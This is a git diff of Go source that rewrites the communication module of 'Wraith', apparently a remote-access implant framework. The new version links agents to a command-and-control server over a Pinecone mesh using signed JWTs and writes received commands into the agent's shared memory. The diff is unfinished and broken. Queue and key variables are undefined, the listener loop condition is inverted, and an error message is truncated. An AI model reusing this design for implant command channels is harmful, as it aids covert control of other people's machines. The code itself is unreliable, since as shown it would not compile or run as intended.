@@ -2,10 +2,16 @@ package stdmod
 
 import (
 	"context"
+	"crypto/ed25519"
 	"fmt"
+	"net"
 	"sync"
+	"time"
 
 	"git.0x1a8510f2.space/0x1a8510f2/wraith/wraith/libwraith"
+	pineconeM "github.com/matrix-org/pinecone/multicast"
+	pineconeR "github.com/matrix-org/pinecone/router"
+	"github.com/pascaldekloe/jwt"
 )
 
 // A CommsManager module implementation which utilises (optionally) encrypted JWT
@@ -13,136 +19,164 @@ import (
 // verified both by the C2 and by Wraith. Otherwise, this CommsManager lacks any
 // particularly advanced features and is meant as a simple default which does a
 // good job in most usecases.
-type JWTCommsManagerModule struct {
-	running      bool
-	runningMutex sync.Mutex
+type PineconeJWTCommsManagerModule struct {
+	mutex sync.Mutex
 
 	// Configuration properties
-	// TODO
+
+	OwnPrivKey         ed25519.PrivateKey
+	AdminPubKey        ed25519.PublicKey
+	UseInboundPinecone bool
+	UseMulticast       bool
+	StaticPeers        []string
 }
 
-func (m *JWTCommsManagerModule) Mainloop(ctx context.Context, w *libwraith.Wraith) error {
+func (m *PineconeJWTCommsManagerModule) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 	// Ensure this instance is only started once and mark as running if so
-	m.runningMutex.Lock()
-	if m.running {
-		m.runningMutex.Unlock()
-		return fmt.Errorf("already running")
+	single := m.mutex.TryLock()
+	if !single {
+		panic(fmt.Errorf("%s already running", libwraith.MOD_COMMS_MANAGER))
 	}
-	m.running = true
-	m.runningMutex.Unlock()
+	defer m.mutex.Unlock()
 
-	// Always clear running status when exiting
-	defer func() {
-		// Mark as not running internally
-		m.runningMutex.Lock()
-		m.running = false
-		m.runningMutex.Unlock()
-	}()
+	// Make sure keys are valid
+	if keylen := len(m.OwnPrivKey); keylen != ed25519.PrivateKeySize {
+		panic(fmt.Errorf("[%s] incorrect private key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
+	}
+	if keylen := len(m.AdminPubKey); keylen != ed25519.PublicKeySize {
+		panic(fmt.Errorf("[%s] incorrect public key size (is %d, should be %d)", libwraith.MOD_COMMS_MANAGER, keylen, ed25519.PublicKeySize))
+	}
 
-	// Watch shm cells required by this module
-	txQueue, txQueueWatchId := w.SHMWatch(libwraith.SHM_TX_QUEUE)
-	rxQueue, rxQueueWatchId := w.SHMWatch(libwraith.SHM_RX_QUEUE)
+	// Init pinecone router
+	router := pineconeR.NewRouter(nil, m.OwnPrivKey, false)
 
-	// Always cleanup SHM when exiting
-	defer func() {
-		// Mark comms as not ready in shm
-		// Ignore err return because we know this isn't a protected cell
-		w.SHMSet(libwraith.SHM_COMMS_READY, false)
+	//pQUIC := pineconeS.NewSessions(nil, router)
 
-		// Unwatch cells
-		w.SHMUnwatch(libwraith.SHM_TX_QUEUE, txQueueWatchId)
-		w.SHMUnwatch(libwraith.SHM_RX_QUEUE, rxQueueWatchId)
-	}()
+	// If inbound pinecone connections are allowed, start listening
+	if m.UseInboundPinecone {
+		go func() {
+			// Spawn a listener on a random port
+			listener, err := net.Listen("tcp", ":0")
+			if err != nil {
+				panic(fmt.Errorf("[%s] failed to ", err))
+			}
 
-	// Mark comms as ready in shm
-	w.SHMSet(libwraith.SHM_COMMS_READY, true)
+			// Loop until exit is requested
+			for ctx.Err() != nil {
+				conn, err := listener.Accept()
+				if err != nil {
+					continue
+				}
+
+				port, _ := router.Connect(
+					conn,
+					pineconeR.ConnectionPeerType(pineconeR.PeerTypeRemote),
+				)
+			}
+
+			listener.Close()
+		}()
+	}
+
+	// If enabled, start multicast
+	if m.UseMulticast {
+		pMulticast := pineconeM.NewMulticast(nil, router)
+		pMulticast.Start()
+	}
+
+	/*connectToStaticPeer := func() {
+		connected := map[string]bool{} // URI -> connected?
+		for _, uri := range m.StaticPeers {
+			connected[uri] = false
+		}
+		attempt := func() {
+			for k := range connected {
+				connected[k] = false
+			}
+			for _, info := range router.Peers() {
+				connected[info.URI] = true
+			}
+			for k, online := range connected {
+				if !online {
+					_ = conn.ConnectToPeer(router, k)
+				}
+			}
+		}
+		for {
+			attempt()
+			time.Sleep(time.Second * 5)
+		}
+	}*/
 
 	// Mainloop
 	for {
 		select {
 		// Trigger exit when requested
 		case <-ctx.Done():
-			return nil
-		// Manage transfer queue
-		case <-txQueue: // TODO
+			return
+
+		// Manage transmit queue
+		case data := <-txQueue:
+			// Make sure the data is of the correct type/format, else ignore
+			txdata, ok := data.(map[string]any)
+			if !ok {
+				continue
+			}
+
+			var claims jwt.Claims
+
+			// Put all data under "w" key
+			claims.Set = map[string]interface{}{"w": txdata}
+
+			claims.EdDSASign(m.TxKey)
+
 		// Manage receive queue
-		case <-rxQueue: // TODO
+		case data := <-rxQueue:
+			// If the data is not a bytearray, it's not a JWT token so should be ignored.
+			databytes, ok := data.([]byte)
+			if !ok {
+				continue
+			}
+
+			// Attempt to parse given data as a JWT.
+			claims, err := jwt.EdDSACheck(databytes, m.RxKey)
+
+			// If we couldn't parse the data, do not attempt further parsing. No error
+			// needs to be reported because this just means we received invalid data.
+			if err != nil {
+				continue
+			}
+
+			// Make sure the token is valid, don't consider expired tokens.
+			if !claims.Valid(time.Now()) {
+				continue
+			}
+
+			if wKey, ok := claims.Set["w"]; !ok {
+				// Make sure that the token has a "w" key which holds all Wraith data.
+
+				continue
+			} else if wKeyMap, ok := wKey.(map[string]interface{}); !ok {
+				// Make sure the "w" key is map[string]interface{} as expected.
+
+				continue
+			} else {
+				// If all is well, send the subkeys of the "w" key to the appropriate shm cells
+
+				for cell, value := range wKeyMap {
+					w.SHMSet(cell, value)
+				}
+			}
 		}
 	}
 }
 
 // Return the name of this module as libwraith.MOD_COMMS_MANAGER
-func (m *JWTCommsManagerModule) WraithModuleName() string {
+func (m *PineconeJWTCommsManagerModule) WraithModuleName() string {
 	return libwraith.MOD_COMMS_MANAGER
 }
 
 /*
-func (m *JWTModule) WraithModuleInit(wraith *libwraith.Wraith) {}
-func (m *JWTModule) ProtoLangModule()                          {}
-
-func (m *JWTModule) Encode(data map[string]interface{}) ([]byte, error) {
-	var claims jwt.Claims
-
-	// Put all data under "w" key
-	claims.Set = map[string]interface{}{"w": data}
-
-	return claims.EdDSASign(m.EncodeKey)
-}
-
-func (m *JWTModule) Decode(data []byte) (map[string]interface{}, error) {
-	// Attempt to parse given data
-	claims, err := jwt.EdDSACheck(data, m.DecodeKey)
-
-	// Directly return error if it exists
-	if err != nil {
-		return nil, err
-	}
-
-	// Make sure the token is valid, don't execute expired tokens
-	if !claims.Valid(time.Now()) {
-		return nil, fmt.Errorf("token parsed but invalid")
-	}
-
-	// Make sure that the token has a "w" key
-	if wKey, ok := claims.Set["w"]; !ok {
-		return nil, fmt.Errorf("no \"w\" key found")
-
-		// Make sure the "w" key is map[string]interface{} as expected
-	} else if wKeyMap, ok := wKey.(map[string]interface{}); !ok {
-		return nil, fmt.Errorf("\"w\" key is unexpected type")
-
-		// If all is well, return the data from "w" key
-	} else {
-		return wKeyMap, nil
-	}
-}
-
-func (m *JWTModule) Identify(data []byte) bool {
-	// Attempt to parse the token to check whether it is, in fact, a token.
-	// Do not yet attempt to verify the signature, that should be done later
-	// when we actually try to use the data within the token.
-	claims, err := jwt.ParseWithoutCheck(data)
-	if err != nil {
-		return false
-	}
-
-	// Despite being a JWT, this token might not be the type of JWT we're looking
-	// for. Check that it contains the `w` key.
-	if wKey, ok := claims.Set["w"]; !ok {
-		return false
-
-		// Finally, check that the `w` key is a map[string]interface{} as expected.
-	} else if _, ok := wKey.(map[string]interface{}); !ok {
-		return false
-	}
-
-	// All checks have passed, this is likely an example of data we can handle
-	return true
-}
-
-//
-//
-//
 
 type ValidityModule struct {
 	wraith *libwraith.Wraith
